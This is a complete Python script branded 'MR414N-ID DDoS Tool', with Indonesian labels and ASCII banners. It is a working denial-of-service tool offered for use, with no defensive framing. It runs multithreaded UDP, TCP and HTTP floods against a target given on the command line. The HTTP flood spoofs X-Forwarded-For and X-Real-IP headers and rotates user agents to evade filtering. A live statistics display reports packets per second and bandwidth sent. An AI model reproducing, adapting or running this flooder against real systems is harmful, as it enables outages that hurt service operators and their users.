# lang: Python 3.11+, file: mr414n_ddos.py
# build: pip install colorama
# usage: python mr414n_ddos.py

import socket
import threading
import random
import time
import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

# ---- BEBEK LINUX ASCII ----

def tampil_bebek():
    bebek = f"""
{Fore.YELLOW}
        .88888888:.
       88888888.88888.
     .8888888888888888.
     888888888888888888
     88' _`88'_  `8888.
     88 88 88 88  8888  oooooooooooooooooooooooo
     88_88_::_88_:88888:o                       o
     88:::,::,:::::8888 o   Linux DDoS Tool    o
     88`:::::::::'`8888  o                       o
    .88  `:::::'    8:88. oooooooooooooooooooooooo
   8888            `8:888.
 .8888'             `888888.
.8888:..  .::.  ...:'8888888:.
8888.'     :'     `'::`88:88888
{Fore.RESET}"""
    print(bebek)

# ---- BANNER MR414N-ID ----

def tampil_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
███╗   ███╗██████╗ ██████╗  ██╗ ██╗  ██╗███╗   ██╗      ██╗██████╗
████╗ ████║██╔══██╗╚════██╗ ██║ ██║  ██║████╗  ██║      ██║██╔══██╗
██╔████╔██║██████╔╝ █████╔╝ ██║ ███████║██╔██╗ ██║      ██║██║  ██║
██║╚██╔╝██║██╔══██╗ ╚═══██╗ ╚═╝ ╚════██║██║╚██╗██║      ██║██║  ██║
██║ ╚═╝ ██║██║  ██║██████╔╝ ██╗      ██║██║ ╚████║      ██║██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝  ╚═╝      ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝
{Fore.RESET}"""

    ddos = f"""
{Fore.CYAN}{Style.BRIGHT}
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Fore.RESET}"""
    print(banner)
    print(ddos)

# ---- ANIMASI LOADING ----

def animasi_loading(teks, durasi=2):
    chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    end = time.time() + durasi
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{Fore.GREEN}[{chars[i % len(chars)]}] {teks}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    print()

# ---- INFO SISTEM ----

def tampil_info(target, port, mode, threads, durasi):
    print(f"{Fore.WHITE}{Style.BRIGHT}{'═'*60}")
    print(f"{Fore.YELLOW}  [*] TARGET IP   : {Fore.RED}{Style.BRIGHT}{target}")
    print(f"{Fore.YELLOW}  [*] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
    print(f"{Fore.YELLOW}  [*] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
    print(f"{Fore.YELLOW}  [*] THREADS     : {Fore.RED}{Style.BRIGHT}{threads}")
    print(f"{Fore.YELLOW}  [*] DURASI      : {Fore.RED}{Style.BRIGHT}{durasi} detik")
    print(f"{Fore.YELLOW}  [*] STATUS      : {Fore.GREEN}{Style.BRIGHT}AKTIF")
    print(f"{Fore.WHITE}{Style.BRIGHT}{'═'*60}\n")

# ---- STATISTIK GLOBAL ----

stats = {"kirim": 0, "error": 0, "bytes": 0}
lock = threading.Lock()

# ---- UDP FLOOD ----

def udp_flood(target, port, end_time, ukuran):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    tujuan = (target, port)
    while time.time() < end_time:
        try:
            data = random.randbytes(ukuran)
            sock.sendto(data, tujuan)
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += ukuran
        except Exception:
            with lock:
                stats["error"] += 1
    sock.close()

# ---- TCP FLOOD ----

def tcp_flood(target, port, end_time, ukuran):
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sock.sendall(random.randbytes(ukuran))
            sock.close()
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += ukuran
        except Exception:
            with lock:
                stats["error"] += 1

# ---- HTTP FLOOD ----

def http_flood(target, port, end_time, ukuran):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
        "curl/8.1.2",
        "python-requests/2.31.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5)",
    ]
    paths = [
        "/", "/index.php", "/login", "/api/v1/users",
        "/search?q=" + "X"*128, "/wp-admin", "/admin/login",
        "/.env", "/config.php", "/api/data?id=" + "1"*64,
    ]
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            ua = random.choice(user_agents)
            path = random.choice(paths)
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*;q=0.9\r\n"
                f"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n\r\n"
            ).encode()
            sock.sendall(req)
            sock.close()
            with lock:
                stats["kirim"] += 1
                stats["bytes"] += len(req)
        except Exception:
            with lock:
                stats["error"] += 1

# ---- PRINTER STATISTIK LIVE ----

def cetak_statistik(target, port, mode, end_time):
    while time.time() < end_time:
        with lock:
            k = stats["kirim"]
            e = stats["error"]
            b = stats["bytes"]
        sisa = max(0, end_time - time.time())
        elapsed = max(0.1, (args.durasi - sisa))
        pps = k / elapsed
        mbps = (b * 8) / (elapsed * 1_000_000)
        sys.stdout.write(
            f"\r{Fore.GREEN}[+]{Style.RESET_ALL} "
            f"{Fore.RED}TARGET:{Style.RESET_ALL} {target}:{port} | "
            f"{Fore.YELLOW}MODE:{Style.RESET_ALL} {mode.upper()} | "
            f"{Fore.CYAN}KIRIM:{Style.RESET_ALL} {k:,} | "
            f"{Fore.MAGENTA}PPS:{Style.RESET_ALL} {pps:.0f} | "
            f"{Fore.BLUE}Mbps:{Style.RESET_ALL} {mbps:.2f} | "
            f"{Fore.RED}ERROR:{Style.RESET_ALL} {e:,} | "
            f"{Fore.WHITE}SISA:{Style.RESET_ALL} {sisa:.0f}s    "
        )
        sys.stdout.flush()
        time.sleep(0.3)
    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}[✓] SELESAI! Total kirim: {stats['kirim']:,} | Error: {stats['error']:,} | Data: {stats['bytes']/1_000_000:.2f} MB{Style.RESET_ALL}")

# ---- MAIN ----

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MR414N-ID DDoS Tool")
    parser.add_argument("--target",   required=True, help="IP atau hostname target")
    parser.add_argument("--port",     type=int, default=80, help="Port target")
    parser.add_argument("--mode",     choices=["udp","tcp","http"], default="udp", help="Mode flood")
    parser.add_argument("--threads",  type=int, default=200, help="Jumlah thread")
    parser.add_argument("--durasi",   type=int, default=60,  help="Durasi (detik)")
    parser.add_argument("--ukuran",   type=int, default=1024, help="Ukuran payload (bytes)")
    args = parser.parse_args()

    os.system("clear" if os.name == "posix" else "cls")

    tampil_bebek()
    time.sleep(0.5)
    tampil_banner()
    time.sleep(0.5)

    animasi_loading("Menginisialisasi sistem...", 1.5)
    animasi_loading("Menyiapkan payload...", 1.0)
    animasi_loading("Membuka koneksi...", 1.0)

    end_time = time.time() + args.durasi
    tampil_info(args.target, args.port, args.mode, args.threads, args.durasi)

    mode_map = {
        "udp":  udp_flood,
        "tcp":  tcp_flood,
        "http": http_flood,
    }
    func = mode_map[args.mode]

    stat_thread = threading.Thread(
        target=cetak_statistik,
        args=(args.target, args.port, args.mode, end_time),
        daemon=True
    )
    stat_thread.start()

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(func, args.target, args.port, end_time, args.ukuran)
            for _ in range(args.threads)
        ]
        for f in futures:
            try: f.result()
            except: pass
